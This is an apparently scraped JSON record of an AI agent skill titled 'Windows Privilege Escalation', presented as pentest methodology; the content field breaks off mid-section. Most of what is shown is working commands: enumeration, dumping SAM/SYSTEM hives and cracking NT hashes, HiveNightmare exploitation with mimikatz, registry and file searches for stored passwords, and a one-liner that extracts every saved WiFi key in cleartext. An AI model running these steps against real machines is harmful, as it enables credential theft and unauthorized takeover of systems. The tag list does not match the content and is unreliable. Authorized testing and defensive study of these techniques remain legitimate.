{
  "id": "antigravity-windows-privilege-escalation",
  "name": "Windows Privilege Escalation",
  "slug": "windows-privilege-escalation",
  "description": "This skill should be used when the user asks to \"escalate privileges on Windows,\" \"find Windows privesc vectors,\" \"enumerate Windows for privilege escalation,\" \"exploit Windows misconfigurations,\" or \"perform post-exploitation privilege escalation.\" It provides comprehensive guidance for discovering",
  "category": "Security & Systems",
  "source": "antigravity",
  "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
  "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/windows-privilege-escalation",
  "content": "\n# Windows Privilege Escalation\n\n## Purpose\n\nProvide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements. This skill covers system enumeration, credential harvesting, service exploitation, token impersonation, kernel exploits, and various misconfigurations that enable escalation from standard user to Administrator or SYSTEM privileges.\n\n## Inputs / Prerequisites\n\n- **Initial Access**: Shell or RDP access as standard user on Windows system\n- **Enumeration Tools**: WinPEAS, PowerUp, Seatbelt, or manual commands\n- **Exploit Binaries**: Pre-compiled exploits or ability to transfer tools\n- **Knowledge**: Understanding of Windows security model and privileges\n- **Authorization**: Written permission for penetration testing activities\n\n## Outputs / Deliverables\n\n- **Privilege Escalation Path**: Identified vector to higher privileges\n- **Credential Dump**: Harvested passwords, hashes, or tokens\n- **Elevated Shell**: Command execution as Administrator or SYSTEM\n- **Vulnerability Report**: Documentation of misconfigurations and exploits\n- **Remediation Recommendations**: Fixes for identified weaknesses\n\n## Core Workflow\n\n### 1. System Enumeration\n\n#### Basic System Information\n```powershell\n# OS version and patches\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\nwmic qfe\n\n# Architecture\nwmic os get osarchitecture\necho %PROCESSOR_ARCHITECTURE%\n\n# Environment variables\nset\nGet-ChildItem Env: | ft Key,Value\n\n# List drives\nwmic logicaldisk get caption,description,providername\n```\n\n#### User Enumeration\n```powershell\n# Current user\nwhoami\necho %USERNAME%\n\n# User privileges\nwhoami /priv\nwhoami /groups\nwhoami /all\n\n# All users\nnet user\nGet-LocalUser | ft Name,Enabled,LastLogon\n\n# User details\nnet user administrator\nnet user %USERNAME%\n\n# Local groups\nnet localgroup\nnet localgroup administrators\nGet-LocalGroupMember Administrators | ft Name,PrincipalSource\n```\n\n#### Network Enumeration\n```powershell\n# Network interfaces\nipconfig /all\nGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address\n\n# Routing table\nroute print\nGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric\n\n# ARP table\narp -A\n\n# Active connections\nnetstat -ano\n\n# Network shares\nnet share\n\n# Domain Controllers\nnltest /DCLIST:DomainName\n```\n\n#### Antivirus Enumeration\n```powershell\n# Check AV products\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName\n```\n\n### 2. Credential Harvesting\n\n#### SAM and SYSTEM Files\n```powershell\n# SAM file locations\n%SYSTEMROOT%\\repair\\SAM\n%SYSTEMROOT%\\System32\\config\\RegBack\\SAM\n%SYSTEMROOT%\\System32\\config\\SAM\n\n# SYSTEM file locations\n%SYSTEMROOT%\\repair\\system\n%SYSTEMROOT%\\System32\\config\\SYSTEM\n%SYSTEMROOT%\\System32\\config\\RegBack\\system\n\n# Extract hashes (from Linux after obtaining files)\npwdump SYSTEM SAM > sam.txt\nsamdump2 SYSTEM SAM -o sam.txt\n\n# Crack with John\njohn --format=NT sam.txt\n```\n\n#### HiveNightmare (CVE-2021-36934)\n```powershell\n# Check vulnerability\nicacls C:\\Windows\\System32\\config\\SAM\n# Vulnerable if: BUILTIN\\Users:(I)(RX)\n\n# Exploit with mimikatz\nmimikatz> token::whoami /full\nmimikatz> misc::shadowcopies\nmimikatz> lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\n```\n\n#### Search for Passwords\n```powershell\n# Search file contents\nfindstr /SI /M \"password\" *.xml *.ini *.txt\nfindstr /si password *.xml *.ini *.txt *.config\n\n# Search registry\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n\n# Windows Autologin credentials\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2>nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\"\n\n# PuTTY sessions\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"\n\n# VNC passwords\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password\n\n# Search for specific files\ndir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*\nwhere /R C:\\ *.ini\n```\n\n#### Unattend.xml Credentials\n```powershell\n# Common locations\nC:\\unattend.xml\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\system32\\sysprep.inf\nC:\\Windows\\system32\\sysprep\\sysprep.xml\n\n# Search for files\ndir /s *sysprep.inf *sysprep.xml *unattend.xml 2>nul\n\n# Decode base64 password (Linux)\necho \"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=\" | base64 -d\n```\n\n#### WiFi Passwords\n```powershell\n# List profiles\nnetsh wlan show profile\n\n# Get cleartext password\nnetsh wlan show profile <SSID> key=clear\n\n# Extract all WiFi passwords\nfor /f \"tokens=4 delims=: \" %a in ('netsh wlan show profiles ^| find \"Profile \"') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr \"SSID Cipher Key\" | find /v \"Number\" & echo.) & @echo on\n```\n\n#### PowerShell History\n```powe",
  "tags": [
    "python",
    "node",
    "api",
    "ai",
    "workflow",
    "document",
    "image",
    "security",
    "vulnerability",
    "aws"
  ],
  "useCases": [],
  "scrapedAt": "2026-01-26T13:22:46.062Z"
}